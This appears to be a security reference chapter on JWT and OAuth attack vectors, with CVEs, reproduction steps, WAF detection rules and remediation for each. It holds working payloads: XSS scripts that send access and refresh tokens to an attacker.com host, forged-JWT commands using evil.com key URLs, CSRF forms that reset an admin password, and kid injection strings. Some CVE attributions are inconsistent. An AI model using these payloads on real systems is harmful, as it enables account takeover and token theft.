# 47 - JWT & OAuth Advanced Attack Vectors (2025-2026)

## Overview

Advanced JWT manipulation and OAuth abuse techniques discovered in 2025-2026, including header injection with URL filter bypasses, claim validation type confusion, OAuth proxy authentication bypasses, redirect URI chaining, and CSRF-based account takeover with SameSite bypasses. All findings are adversarially verified with real CVE references and reproduction steps.

---

## 47.1 JWT JKU/X5U Header Injection with URL Filter Bypass

**Severity:** CRITICAL
**CVEs:** CVE-2018-0114, CVE-2024-54150, CVE-2026-14916
**Affected:** node-jose (<0.11.0), cjwt C library (<2.3.0), Kong API Gateway Enterprise

### Description

When a JWT library or application trusts the `jku` (JWK Set URL) or `x5u` (X.509 URL) header claim without restricting which domains it fetches from, an attacker can point these headers at a URL they control. The server then fetches the attacker's public key and uses it to verify a token the attacker signed with the corresponding private key. This effectively lets the attacker forge tokens with arbitrary claims (e.g., admin role). The attack also opens an SSRF vector since the server makes an outbound HTTP request to the attacker-specified URL.

**CVE-2018-0114** (node-jose, before 0.11.0): Library trusted a public key placed directly in the JWT header (embedded JWK variant).

**CVE-2024-54150** (cjwt, CVSS 9.1-10.0, fixed in 2.3.0): Algorithm confusion (RS256 to HS256) enabling signature bypass by using the server's public key as the HMAC secret.

**CVE-2026-14916** (Kong API Gateway Enterprise, CVSS 7.7): JWT plugin did not validate that the signing algorithm was compatible with the key type, allowing unauthenticated token forgery.

### Reproduction Steps

#### JKU Header Injection
```bash
# Step 1 - Generate attacker key pair
openssl genrsa -out attacker_private.pem 2048
openssl rsa -in attacker_private.pem -pubout -out attacker_public.pem

# Step 2 - Create a JWK Set (jwks.json) containing the public key with a chosen 'kid'
# Step 3 - Host the jwks.json on attacker-controlled server
# e.g., https://evil.com/.well-known/jwks.json

# Step 4 - Decode target JWT, modify header:
# {"alg":"RS256","typ":"JWT","jku":"https://evil.com/.well-known/jwks.json","kid":"attacker-key-id"}

# Step 5 - Modify payload claims (e.g., set "role":"admin", "sub":"admin_user")

# Step 6 - Sign with attacker_private.pem and send:
curl -H 'Authorization: Bearer <forged_token>' https://target.com/api/admin
```

#### Using jwt_tool
```bash
# JKU spoof
python3 jwt_tool.py <token> -X s -ju https://evil.com/jwks.json

# X5U header injection
python3 jwt_tool.py <token> -I -hc x5u -hv https://evil.com/cert.pem

# Embedded JWK injection (CVE-2018-0114 style)
python3 jwt_tool.py <token> -X i
```

#### Algorithm Confusion (CVE-2024-54150)
```bash
# Step 1 - Obtain server's RSA public key
# (from /jwks.json, /.well-known/openid-configuration, or TLS certificate)
openssl x509 -pubkey -noout -in cert.pem > public.pem

# Step 2 - Change JWT header 'alg' from RS256 to HS256
# Step 3 - Sign the token using the public key file as the HMAC secret
python3 jwt_tool.py <token> -X k -pk public.pem

# Step 4 - Send the forged token to the target API
curl -H 'Authorization: Bearer <forged_token>' https://target.com/api/admin
```

#### kid SQL Injection Chain
```bash
# kid with SQL injection:
# kid: "key1' UNION SELECT 'known_secret' --"

# kid with path traversal:
# kid: "../../dev/null"  (empty HMAC secret)
```

### URL Filter Bypass Techniques

When servers validate the `jku`/`x5u` URL against an allowlist, attackers bypass it via:

| Technique | Example | Mechanism |
|-----------|---------|-----------|
| Open redirect on trusted domain | `jku=https://trusted.com/redirect?url=https://evil.com/jwks.json` | Allowlisted domain redirects to attacker |
| URL parsing inconsistency (@) | `jku=https://trusted.com@evil.com/jwks.json` | Parser treats evil.com as actual host |
| Fragment/path tricks | `jku=https://trusted.com/..%2f..%2fevil.com/jwks.json` | Path traversal escapes domain check |
| DNS rebinding | Domain alternates between public IP and attacker IP | Passes allowlist check but connects to attacker |

### Chaining Potential

1. **SSRF** -- Server's outbound request to fetch the key can be redirected to internal services (cloud metadata at 169.254.169.254, internal APIs)
2. **Privilege escalation** -- Forged tokens with admin claims grant unauthorized access to administrative endpoints
3. **Account takeover** -- Forging tokens for arbitrary user IDs
4. **kid SQL injection** -- If `kid` parameter used in database queries without sanitization
5. **kid path traversal** -- If kid used to read key files, traversal to predictable files (e.g., `/dev/null` for empty HMAC secret)
6. **Information disclosure** -- SSRF responses reflected in error messages

### Detection

```
# ModSecurity WAF Rule
SecRule REQUEST_HEADERS:Authorization "@rx \"jku\"\s*:\s*\"https?://(?!trusted\.domain\.com)" \
  "id:JWT_JKU_INJECTION,phase:1,deny,status:403,msg:'Untrusted JKU domain in JWT'"
```

- Monitor JWT headers for `jku`/`x5u` fields pointing to external/untrusted domains
- Alert when tokens arrive with `alg:HS256` on RS256 endpoints
- Detect `alg:none` tokens (should never appear in production)
- Monitor outbound HTTP requests from authentication services to unexpected external hosts
- Use Burp Collaborator or interactsh to test for SSRF by setting jku/x5u to a canary domain

### Remediation

- Pin allowed algorithms server-side (never read `alg` from the token for verification decisions)
- Maintain a strict allowlist of trusted JWKS URLs in server configuration; never fetch keys from token-supplied URLs
- Use asymmetric algorithms (RS256/ES256) with pinned public keys
- Upgrade node-jose past 0.11.0, cjwt past 2.3.0, Kong Enterprise to patched version
- Validate `kid` values against a known set; never use kid in SQL queries or file path operations without sanitization
- Implement key rotation with versioned key IDs from a trusted JWKS endpoint

### References

- https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection
- https://github.com/ticarpi/jwt_tool/wiki/Known-Exploits-and-Attacks
- https://pentesterlab.com/blog/another-jwt-algorithm-confusion-cve-2024-54150
- https://app.opencve.io/cve/CVE-2024-54150
- https://github.com/adityathebe/POC-CVE-2018-0114
- https://app.opencve.io/cve/CVE-2026-14916

---

## 47.2 JWT Claim Validation Bypass - Issuer Array Injection

**Severity:** HIGH
**CVEs:** CVE-2025-30144, CVE-2025-53864
**Affected:** fast-jwt (<5.0.6), Nimbus JOSE+JWT (<10.0.2 / <9.37.4)

### Description

The fast-jwt library's `validateClaimValues` function uses `Array.some()` to check issuer claims. An attacker crafts a JWT where the `iss` claim is a JSON array containing both the attacker's domain and the legitimate issuer. Because `some()` returns true if ANY element matches, the validation passes despite the attacker-controlled domain being present. RFC 7519 specifies `iss` as a StringOrURI (single string), but fast-jwt accepted arrays.

A separate vulnerability (CVE-2025-53864, CVSS 5.8) in Nimbus JOSE+JWT allowed uncontrolled recursion when parsing deeply nested JSON in JWT claim sets (CWE-674), causing stack exhaustion and denial of service.

An additional report (October 2026) suggests fast-jwt may also accept JSON array payloads (where `typeof [] === 'object'`), causing claim validators to skip `exp`, `iss`, `aud` checks entirely because the `in` operator returns false on arrays.

### Reproduction Steps

#### CVE-2025-30144 (Issuer Array Injection)
```bash
# Step 1 - Identify target using fast-jwt < 5.0.6
# Step 2 - Obtain a valid JWT from the target application
# Step 3 - Decode the JWT payload and modify the 'iss' claim:
# Original: {"iss": "https://auth.legitimate.com", "sub": "user123"}
# Modified: {"iss": ["https://evil.com", "https://auth.legitimate.com"], "sub": "admin", "role": "admin"}

# Step 4 - If combined with get-jwks, the library may fetch keys from first URL (evil.com)
# Step 5 - Sign the token with your own key (if key fetching is redirected)
# Step 6 - Send the forged token:
curl -H 'Authorization: Bearer <forged_token>' https://target.com/api/admin
```

**Vulnerable code pattern:**
```javascript
// Vulnerable code in fast-jwt < 5.0.6:
if (Array.isArray(claimValue)) {
  return claimValue.some(v => allowedValues.includes(v)); // ANY match passes
}
// Fixed in 5.0.6 with validateClaimArrayValues requiring ALL to match
```

#### CVE-2025-53864 (Nested JSON DoS)
```bash
# Craft a JWT with deeply nested JSON payload:
# payload = '{' * 10000 + '"a":1' + '}' * 10000

# Base64url-encode header and payload, add dummy signature
# Send to target:
curl -X POST \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <nested_jwt>' \
  https://target.com/api/endpoint
# Server's Nimbus parser will enter deep recursion and crash with StackOverflowError
```

#### Array Payload Bypass (October 2026 report)
```bash
# Craft JWT where the payload is a JSON array instead of an object:
# Payload: ["element1", "element2"]

# The decoder accepts it because typeof [] === 'object'
# Claim validators skip exp, iss, aud because 'iss' in [] returns false
# Result: expired tokens and tokens with wrong issuers pass validation
```

### Chaining Potential

1. **Key source manipulation** -- When combined with get-jwks library, the attacker's domain in the iss array may be used to fetch JWKS, allowing complete token forgery
2. **Privilege escalation** -- Forged tokens with admin claims bypass authorization
3. **Account takeover** -- Tokens with arbitrary `sub` claims impersonate other users
4. **SSRF** -- If the issuer URL is used for OpenID Connect discovery (`/.well-known/openid-configuration`), the server makes requests to attacker infrastructure
5. **Application-layer DoS** (CVE-2025-53864) -- Resource exhaustion masking other attacks

### Detection

- Check that JWT `iss` claims are strings, not arrays, before passing to the library
- WAF rule: Inspect decoded JWT payloads for `iss` values starting with `[` (pattern: `"iss"\s*:\s*\[`)
- Dependency scanning: Flag fast-jwt versions below 5.0.6
- Request size monitoring for nested JSON DoS: Alert on JWTs with decoded payload > 10KB
- Flag Nimbus JOSE+JWT versions before 10.0.2 or 9.37.4

### Remediation

- Upgrade fast-jwt to 5.0.6+ (adds `validateClaimArrayValues` with proper validation)
- Upgrade Nimbus JOSE+JWT to 10.0.2 or 9.37.4 (adds nesting depth limit)
- Add application-level validation that `iss` is a string before library processing
- Implement request payload size limits at the gateway level

### References

- https://app.opencve.io/cve/CVE-2025-30144
- https://osv.dev/vulnerability/CVE-2025-30144
- https://github.com/advisories/GHSA-xwmg-2g98-w7v9
- https://www.miggo.io/vulnerability-database/cve/CVE-2025-53864

---

## 47.3 OAuth2-Proxy Authentication Bypass via Query Parameter

**Severity:** CRITICAL (CVSS 9.1)
**CVE:** CVE-2025-54576
**Affected:** oauth2-proxy versions 7.10.0 and earlier

### Description

The core bypass exploits a mismatch between documented behavior (path-only matching) and actual behavior (full URI matching including query parameters) in oauth2-proxy's `skip_auth_routes`. An attacker crafts requests to protected endpoints with query parameters that cause the full URI to match a skip-auth regex pattern, completely bypassing OAuth2 authentication.

The vulnerable code was in `oauthproxy.go` (lines 582-584) and `pkg/requests/util/util.go` (lines 37-44). The patch in version 7.11.0 introduced a new function `requestutil.GetRequestPath` that strips query parameters from the URI before regex matching occurs in the `isAllowedPath` function.

### Reproduction Steps

```bash
# Step 1 - Identify oauth2-proxy deployment
curl -v https://target.com/any-path
# Look for headers: X-Auth-Request-Email, X-Auth-Request-User
# Look for redirect to /oauth2/sign_in

# Step 2 - Discover skip-auth patterns (common configurations):
# skip_auth_routes = ["^/health$", "^/ready$", "^/public/.*"]
# Or broader patterns like:
# skip_auth_routes = ["^/foo/.*/bar$"]

# Step 3 - Craft bypass payloads:
# If skip_auth_routes = ["^/foo/.*/bar$"]:
curl 'https://target.com/api/sensitive-data?param=/foo/x/bar'
# Full URI: '/api/sensitive-data?param=/foo/x/bar'
# Regex ^/foo/.*/bar$ matches because .* spans across ? into query string

# If skip_auth_routes = ["^/public/.*"]:
curl 'https://target.com/api/users?redirect=/public/page'

# If pattern is unanchored "health":
curl 'https://target.com/api/admin?x=health'
# Full URI contains 'health', matches unanchored pattern

# Wildcard exploitation:
curl 'https://target.com/admin/users?_=/public/assets/style.css'

# Step 4 - Escalate access
curl 'https://target.com/api/v1/admin/settings?x=/foo/y/bar'
curl -X POST 'https://target.com/api/v1/users/create' \
  -d '{"role":"admin"}' -H 'Content-Type: application/json' \
  --url-query 'x=/foo/y/bar'

# Step 5 - Verify bypass (compare responses)
# Without bypass (should get 302 to OAuth login):
curl -v https://target.com/api/admin
# With bypass (should get 200 with data):
curl -v 'https://target.com/api/admin?x=/foo/y/bar'
```

### Bypass Techniques

| Technique | Description |
|-----------|-------------|
| Unanchored patterns | Any regex without proper `^` and `$` anchors can be matched by query parameter values |
| Wildcard spanning | `.*` in regex spans across the `?` delimiter into query parameters |
| Pattern injection | Craft query parameter values that satisfy the regex pattern |
| Multiple query params | Use multiple parameters to construct strings matching complex patterns |
| URL-encoded values | Some regex engines may decode before matching, allowing encoded pattern injection |

### Chaining Potential

- **Direct backend API access** -- All backend APIs behind oauth2-proxy exposed
- **Data exfiltration** -- Access to sensitive data endpoints without credentials
- **Privilege escalation** -- Backend APIs trust the proxy's authentication decision (common in Kubernetes zero-trust-lite architectures)
- **Internal service discovery** -- Access health/debug/metrics endpoints exposing infrastructure details
- **Token theft** -- Backend may return OAuth tokens or session data in responses

Impact is amplified because oauth2-proxy is commonly the sole authentication layer in front of Kubernetes services.

### Detection

```bash
# ModSecurity WAF Rule
SecRule REQUEST_URI "@rx \?.*(/health|/ready|/public/)" \
  "id:OAUTH2PROXY_BYPASS,phase:1,log,msg:'Potential oauth2-proxy skip-auth bypass'"

# Regex audit script
for route in $skip_auth_routes; do
  echo "Testing pattern: $route"
  echo '/api/admin?x=/foo/y/bar' | grep -P "$route" && echo 'VULNERABLE'
done
```

- Compare authentication decisions (skip vs. enforce) against request paths
- Alert when skip decisions occur for paths that should require auth
- Monitor for unauthenticated requests receiving 200 responses from protected endpoints

### Remediation

- Upgrade to oauth2-proxy 7.11.0+ immediately
- Use exact path matches: `skip_auth_routes = ["^/public/assets$", "^/public/health$"]`
- Implement backend authentication as defense-in-depth
- Strip query parameters before they reach oauth2-proxy

### References

- https://github.com/oauth2-proxy/oauth2-proxy/security/advisories/GHSA-7rh7-c77v-6434
- https://nvd.nist.gov/vuln/detail/CVE-2025-54576
- https://socradar.io/blog/oauth2-proxy-cve-2025-54576-bypass-authentication/

---

## 47.4 OAuth Redirect URI Bypass via Chained Redirects

**Severity:** HIGH
**CVE:** CVE-2024-2419
**Affected:** Keycloak (URL parsing bypass), applications with open redirects on whitelisted domains

### Description

OAuth implementations that validate redirect_uri by checking only the domain or origin (not the exact path) are vulnerable to authorization code interception through chained redirects. Attackers find an open redirect on a trusted subdomain or whitelisted path, chain it with the OAuth authorization flow, and intercept the authorization code or access token. RFC 9700 (January 2025) now explicitly requires exact string matching of redirect URIs and prohibits the implicit grant flow.

Real-world cases include:
- **Booking.com** (Salt Labs): Facebook validated only the Booking.com origin domain, enabling chained redirects to leak authorization codes and achieve full account takeover across Booking.com, Kayak.com, and Google sign-in flows
- **CVE-2024-2419** (Keycloak, CVSS 7.1): Host-allowlist bypass through URI parsing inconsistency
- **Microsoft 2026 campaigns**: Threat actors registered malicious apps in their own Entra ID tenants with redirect URLs pointing to attacker infrastructure
- **cloud.gov** (HackerOne #665651): $750 bounty for chain demonstrated in production

### Reproduction Steps

#### Open Redirect Chain (Booking.com Pattern)
```bash
# Step 1 - Find an open redirect on the target's domain
curl -v 'https://target.com/redirect?url=https://evil.com'
# Also check: /login?next=, /logout?redirect=, /oauth/callback?continue=

# Step 2 - Craft OAuth URL chaining through the open redirect
https://oauth-provider.com/authorize?client_id=TARGET_ID\
  &redirect_uri=https://target.com/redirect%3Furl%3Dhttps://evil.com\
  &response_type=code&scope=openid+email

# Step 3 - Set up capture server on evil.com
python3 -c "
import http.server
class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'Captured: {self.path}')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Loading...')
http.server.HTTPServer(('0.0.0.0', 443), Handler).serve_forever()
"

# Step 4 - Exchange captured authorization code
curl -X POST https://oauth-provider.com/token \
  -d 'grant_type=authorization_code' \
  -d 'code=CAPTURED_CODE' \
  -d 'redirect_uri=https://target.com/oauth/callback' \
  -d 'client_id=TARGET_CLIENT_ID' \
  -d 'client_secret=TARGET_CLIENT_SECRET'
# For public clients (SPAs, mobile), no client_secret needed
```

#### URL Parsing Bypasses (CVE-2024-2419 Keycloak)
```bash
redirect_uri=https://trusted.com%40evil.com/callback
redirect_uri=https://trusted.com%23@evil.com/callback
redirect_uri=https://evil.com\@trusted.com/callback
redirect_uri=https://trusted.com/%252e%252e/evil.com
```

#### Microsoft OAuth Redirect Abuse (2026 Phishing)
```
1. Register OAuth application in own Entra ID tenant
2. Configure redirect_uri to attacker-controlled domain
3. Craft link with intentionally invalid scope (no consent prompt):
   https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
     client_id=ATTACKER_APP_ID&
     redirect_uri=https://malware.example.com&
     response_type=code&
     scope=invalid_scope
4. Victim sees legitimate Microsoft login, authenticates
5. Microsoft redirects to attacker's domain
```

### Bypass Techniques Matrix

| Technique | Description | Mitigation |
|-----------|-------------|------------|
| Open redirect chaining | Find redirect on whitelisted domain | Remove all open redirects from registered domains |
| Subdomain takeover | Claim abandoned subdomain of whitelisted domain | Monitor DNS for dangling CNAMEs |
| URL parser inconsistencies | `@`, `#`, `\`, double encoding confuse validator | Use RFC-compliant URL parser |
| Path traversal | `../` sequences if only domain validated | Enforce exact path matching |
| Implicit flow exploitation | `response_type=token` delivers token in URL fragment | Use code flow with PKCE |
| PKCE downgrade | Omit `code_challenge` from initial request | Reject flows without PKCE |
| State parameter manipulation | Predictable or missing state enables CSRF | Cryptographic binding of state |

### Chaining Potential

1. **Full account takeover** -- Exchanging stolen authorization code for access token
2. **Lateral movement** -- OAuth provider used for SSO across multiple services
3. **Persistent access** -- Obtaining refresh tokens for long-term access
4. **Phishing amplification** -- Legitimate OAuth login page makes attack convincing
5. **Malware delivery** -- OAuth redirects bypass email security filters (Microsoft 2026 campaigns)

### Detection

- Log authorization requests with redirect_uri paths differing from registered callback
- Monitor for redirect chains to external domains after OAuth callbacks
- Alert on authorization codes redeemed from different IP addresses than originating auth request
- Scan for open redirect vulnerabilities on all registered redirect_uri domains

### Remediation

- Enforce exact string matching for redirect_uri (no wildcards, no partial domain matching)
- Implement PKCE (RFC 7636) as mandatory for all OAuth flows (OAuth 2.1 mandates this)
- Enforce S256 code_challenge_method; reject `plain` method
- Remove all open redirect vulnerabilities from redirect target domains
- Use `response_type=code` (not token) to keep tokens server-side
- For Microsoft Entra ID: Restrict app registration to verified publishers

### References

- https://salt.security/blog/traveling-with-oauth-account-takeover-on-booking-com
- https://www.microsoft.com/en-us/security/blog/2026/03/02/oauth-redirection-abuse-enables-phishing-malware-delivery/
- https://www.rfc-editor.org/rfc/rfc9700.html

---

## 47.5 CSRF + SameSite Bypass for Password/Email Change Account Takeover

**Severity:** HIGH
**CVEs:** CVE-2024-28143, CVE-2024-51382
**Affected:** Casdoor (CVE-2023-34927), JATOS v3.9.3 (CVE-2024-51382), Langfuse SSO (GHSA-w9pw-c549-5m6w)

### Description

CSRF on password/email change endpoints combined with SameSite Lax bypass via method override (`_method=POST` on GET requests). The most dangerous variant occurs when the password change endpoint requires neither the current password nor a CSRF token. Multiple bypass techniques defeat modern CSRF protections including SameSite cookies and token validation.

### Reproduction Steps

#### Auto-Submitting CSRF Form
```html
<html><body>
<form id='csrf' action='https://target.com/api/set-password' method='POST'>
  <input type='hidden' name='oldPassword' value='anything'/>
  <input type='hidden' name='newPassword' value='attacker123'/>
  <input type='hidden' name='userOwner' value='built-in'/>
  <input type='hidden' name='userName' value='admin'/>
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>
```

#### SameSite Lax Bypass via Method Override
```html
<!-- Frameworks accepting _method: Symfony, Rails, Laravel, Django, Spring -->
<form id='csrf' action='https://target.com/api/set-password' method='GET'>
  <input type='hidden' name='_method' value='POST'/>
  <input type='hidden' name='newPassword' value='attacker123'/>
  <input type='hidden' name='userName' value='admin'/>
</form>
<script>document.getElementById('csrf').submit();</script>
```

#### Content-Type Manipulation (Avoid CORS Preflight)
```html
<!-- Send JSON payload with text/plain to avoid preflight -->
<form id='csrf' action='https://target.com/api/change-email'
      method='POST' enctype='text/plain'>
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}' type='hidden'/>
</form>
<script>document.getElementById('csrf').submit();</script>
```

#### SSO/OAuth CSRF Variant (Langfuse Pattern)
```
1. Initiate OAuth flow with attacker's authorization code
2. Craft link to OAuth callback with attacker's code
3. Victim clicking link binds attacker's identity to victim's account
```

### CSRF Protection Bypass Techniques

| Bypass | Description | Affected Frameworks |
|--------|-------------|-------------------|
| Token removal | Omit CSRF token entirely; many servers only validate when present | Various |
| Method override | `_method=POST` converts GET to POST, bypassing SameSite Lax | Symfony, Rails, Laravel, Django, Spring |
| Content-Type manipulation | `text/plain` avoids CORS preflight while server parses as JSON | Express, Flask, Spring |
| Subdomain cookie scope | Exploit cookies scoped to parent domain from controlled subdomain | All |
| Token fixation | Set known CSRF token via cookie injection (double-submit pattern) | OWASP double-submit implementations |
| Referer suppression | `<meta name="referrer" content="no-referrer">` defeats Referer checks | Legacy Referer-based CSRF |
| On-site gadgets (SameSite Strict) | Client-side redirects within the site bypass Strict mode | SPA frameworks |

### Chaining Potential

1. **Stored XSS + CSRF** -- XSS payload automatically executes CSRF without external page
2. **Login CSRF + Self-XSS** -- Force victim into attacker's session, execute self-XSS, pivot back
3. **OAuth callback CSRF** -- Link attacker identity to victim account
4. **Subdomain takeover + CSRF** -- Deliver CSRF from same-site context bypassing SameSite Strict
5. **Open redirect + CSRF** -- Deliver payloads from trusted domain context

### Detection

```
# WAF Rule - Cross-origin state-changing requests
SecRule REQUEST_HEADERS:Referer "!@contains target.com" \
  "chain,id:CSRF_DETECT,phase:2"
  SecRule REQUEST_URI "@rx (/set-password|/change-email|/account/settings)" \
    "log,msg:'Cross-origin state-changing request detected'"
```

- Monitor for password/email change requests with missing or invalid CSRF tokens
- Alert on changes where Referer/Origin indicates cross-origin request
- Alert on multiple password changes for different accounts from the same IP

### Remediation

- Require the current password for any password change
- Implement synchronizer token pattern with per-request tokens
- Set `SameSite=Strict` on session cookies (not just Lax)
- Validate the `state` parameter cryptographically for OAuth flows
- Disable HTTP method override in production (`_method` parameter)
- Implement strict Content-Type checking (`application/json` only for JSON APIs)

### References

- https://nvd.nist.gov/vuln/detail/CVE-2024-28143
- https://nvd.nist.gov/vuln/detail/CVE-2024-51382
- https://github.com/langfuse/langfuse/security/advisories/GHSA-w9pw-c549-5m6w
- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

---

## 47.6 XSS to OAuth Token Theft to Account Takeover Chain

**Severity:** HIGH
**Affected:** Applications storing OAuth tokens in browser-accessible locations (localStorage, sessionStorage, URL fragments)

### Description

XSS payloads interact with OAuth flows to extract tokens. The primary attack surfaces are: applications storing OAuth tokens in localStorage/sessionStorage, OAuth callbacks passing tokens in URL fragments, and XSS-initiated OAuth flows in popups. In the Hotjar case (Salt Security, July 2024), over 1 million websites were at risk because XSS-injected JavaScript could open a popup OAuth flow, read the returned token, and use it to log into the victim's account. The "SSO gadgets" concept formalizes how OAuth2/OIDC behaviors can be abused by attackers to obtain access_token or id_token for victim users.

### Reproduction Steps

#### Hotjar-Style Attack (XSS + OAuth Popup Token Theft)
```html
<!-- Step 1: XSS via returnURL parameter with javascript: URI -->
https://insights.hotjar.com/auth?returnURL=javascript:void(document.location='https://attacker.com/steal?token='+localStorage.getItem('access_token'))

<!-- Step 2: More sophisticated -- open popup for silent OAuth flow -->
<script>
// Open OAuth authorization endpoint in popup
var popup = window.open(
  'https://accounts.google.com/o/oauth2/auth?client_id=TARGET_ID&redirect_uri=https://target.com/callback&response_type=token&scope=email',
  'oauth', 'width=1,height=1'
);

// Poll popup for token in URL fragment
var timer = setInterval(function() {
  try {
    if (popup.location.hash) {
      var token = popup.location.hash.match(/access_token=([^&]+)/)[1];
      fetch('https://attacker.com/collect?token=' + token);
      popup.close();
      clearInterval(timer);
    }
  } catch(e) {} // Cross-origin errors until redirect completes
}, 100);
</script>
```

#### localStorage Token Theft (Simpler Variant)
```html
<script>
fetch('https://attacker.com/steal?token='+localStorage.getItem('access_token')
  +'&refresh='+localStorage.getItem('refresh_token'));
</script>
```

#### Self-XSS + Login CSRF + OAuth Chain
```
Step 1: Find a self-XSS (only exploitable against yourself)
Step 2: Chain with login CSRF to force victim into attacker's session
Step 3: Self-XSS executes in victim's browser
Step 4: Payload initiates OAuth flow capturing victim's real token
```

### Chaining Potential

1. **Full account takeover** -- Attacker gains complete access to victim's account
2. **SSO cascade** -- If application is an identity provider, stolen token accesses all federated applications
3. **Data harvesting** -- Hotjar tokens exposed screen recording data including banking details
4. **Persistent XSS + mass token theft** -- Stored XSS harvests tokens from all visitors
5. **OAuth scope escalation** -- Broad scopes (email, drive.readonly) extend access to OAuth provider's data

### Remediation

- **Backend-for-Frontend (BFF) pattern** -- Move OAuth tokens to server-side storage; browser receives only HttpOnly, Secure, SameSite=Strict session cookie
- **Strict CSP** -- `default-src 'self'; script-src 'nonce-{random}'; object-src 'none'; base-uri 'self'`
- **Exact redirect_uri matching** on the OAuth provider
- **PKCE for all OAuth flows** including confidential clients
- **Short access token lifetimes** (5-15 minutes)
- **Token binding / DPoP** (sender-constrained tokens) to prevent replay from different devices

### References

- https://salt.security/blog/over-1-million-websites-are-at-risk-of-sensitive-information-leakage---xss-is-dead-long-live-xss
- https://security.lauritz-holtmann.de/post/xss-ato-gadgets/

---

## 47.7 JWT & OAuth Security Controls Matrix

### JWT Security Controls

| Attack | Detection | Prevention |
|--------|-----------|------------|
| JKU/X5U injection | Monitor for external URLs in JWT headers | Pin allowed algorithms server-side; strict JWKS URL allowlist |
| Algorithm confusion | Alert on HS256 tokens on RS256 endpoints | Use asymmetric algorithms with pinned public keys |
| Issuer array injection | Check iss type is string, not array | Upgrade fast-jwt to 5.0.6+; application-level validation |
| kid SQL injection | WAF rules for SQL patterns in JWT kid | Validate kid against known set; parameterized queries |
| Nested JSON DoS | Request size monitoring; stack depth monitoring | Upgrade Nimbus JOSE+JWT to 10.0.2+; payload size limits |

### OAuth Security Controls

| Attack | Detection | Prevention |
|--------|-----------|------------|
| Redirect URI bypass | Log redirect_uri variations per client_id | Exact string matching for redirect_uri; mandatory PKCE |
| AiTM token theft | Impossible travel; new MFA registration after sign-in | FIDO2/WebAuthn; Token Protection; device binding |
| Open redirect chain | Monitor for redirect chains after OAuth callbacks | Remove all open redirects from registered domains |
| Device code phishing | Alert on device code flows from unexpected apps | Conditional Access policies restricting device code flow |
| XSS token theft | CSP violation reports; localStorage access patterns | BFF pattern; tokens never in browser storage |
| CSRF on password change | Cross-origin state-changing requests | SameSite Strict; require current password; CSRF tokens |
| Query parameter auth bypass | Skip-auth decisions for unexpected paths | Upgrade oauth2-proxy 7.11.0+; exact path matching |

---

## 47.8 Comprehensive WAF Rules for JWT/OAuth Protection

```
# JWT JKU Injection
SecRule REQUEST_HEADERS:Authorization "@rx \"jku\"\s*:\s*\"https?://(?!trusted\.domain\.com)" \
  "id:1001,phase:1,deny,status:403,msg:'Untrusted JKU domain in JWT'"

# JWT Algorithm Confusion (HS256 on RS256 endpoint)
SecRule REQUEST_HEADERS:Authorization "@rx \"alg\"\s*:\s*\"(HS256|HS384|HS512|none)\"" \
  "id:1002,phase:1,deny,status:403,msg:'Suspicious JWT algorithm'"

# JWT Issuer Array Injection
SecRule REQUEST_HEADERS:Authorization "@rx \"iss\"\s*:\s*\[" \
  "id:1003,phase:1,deny,status:403,msg:'JWT issuer array injection attempt'"

# OAuth2-Proxy Skip-Auth Bypass
SecRule REQUEST_URI "@rx \?.*(/health|/ready|/public/)" \
  "id:1004,phase:1,log,msg:'Potential oauth2-proxy skip-auth bypass'"

# CSRF on State-Changing Endpoints
SecRule REQUEST_HEADERS:Origin "!@contains target.com" \
  "chain,id:1005,phase:2"
  SecRule REQUEST_URI "@rx (/set-password|/change-email|/force-reset)" \
    "deny,status:403,msg:'Cross-origin state-changing request blocked'"

# OAuth Redirect URI with Suspicious Parameters
SecRule ARGS:redirect_uri "@rx (\.\.|%2e%2e|%252e|@|%40|\\\\)" \
  "id:1006,phase:1,deny,status:400,msg:'Suspicious redirect_uri manipulation'"
```

---

## 47.9 CVE Reference Index

| CVE | Component | Category | Severity | Fixed Version |
|-----|-----------|----------|----------|---------------|
| CVE-2018-0114 | node-jose | Embedded JWK injection | Critical | 0.11.0+ |
| CVE-2024-54150 | cjwt C library | Algorithm confusion | Critical (9.1-10.0) | 2.3.0+ |
| CVE-2026-14916 | Kong API Gateway Enterprise | Algorithm mismatch token forgery | High (7.7) | Patched |
| CVE-2025-30144 | fast-jwt | Issuer array injection | High | 5.0.6+ |
| CVE-2025-53864 | Nimbus JOSE+JWT | Nested JSON DoS | Medium (5.8) | 10.0.2+ / 9.37.4+ |
| CVE-2025-54576 | oauth2-proxy | Query parameter auth bypass | Critical (9.1) | 7.11.0+ |
| CVE-2024-2419 | Keycloak | URL parsing redirect bypass | High (7.1) | Patched |
| CVE-2024-28143 | Various | CSRF password change | High | N/A |
| CVE-2024-51382 | JATOS v3.9.3 | CSRF admin password reset | High (8.4) | Patched |

---

## 47.10 Tool Reference

| Tool | Purpose | Source |
|------|---------|--------|
| jwt_tool | JWT attack automation (JKU spoof, algorithm confusion, kid injection) | github.com/ticarpi/jwt_tool |
| Evilginx | AiTM reverse proxy phishing framework for OAuth token theft | github.com/kgretzky/evilginx2 |
| Burp JWT Extensions | JWT editing, signing, and attack automation | BApp Store |
| CORStest | CORS misconfiguration scanning | github.com/RUB-NDS/CORStest |
| DOMPurify | XSS prevention via HTML sanitization | github.com/cure53/DOMPurify |
| PKCE Tools | Generate code_verifier/code_challenge for OAuth testing | Various |
